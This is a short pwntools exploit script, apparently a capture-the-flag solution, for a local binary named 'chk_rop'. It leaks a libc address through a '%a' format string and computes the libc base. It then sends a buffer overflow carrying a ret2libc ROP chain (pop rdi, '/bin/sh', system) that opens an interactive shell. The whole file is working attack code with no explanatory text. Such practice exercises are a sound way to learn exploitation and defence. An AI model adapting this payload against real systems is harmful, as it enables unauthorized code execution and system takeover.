from pwn import *
context.binary = ELF('./chk_rop')
context.log_level = 'debug'
libc = context.binary.libc


def dbg():
	gdb.attach(p)
	raw_input()

p = process('./chk_rop')
#dbg()
p.recvline()
p.sendline('%a')	#leak
p.recvuntil('0x0.0')
leak = int('0x'+p.recvuntil('p').strip('p'), 16) << 4

print "leak ==> ", hex(leak)
libc.address = leak - libc.symbols['_IO_2_1_stdout_']
print "libc ==> ", hex(libc.address)

system = libc.symbols['system']
binsh = next(libc.search('/bin/sh'))

p.sendafter('filename\n', 'a'*0x10)		#len = 0 or 0x10

pop_rdi = 0x400883
payload = 'a'*0x58
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendlineafter("content", payload)
p.interactive()
p.close()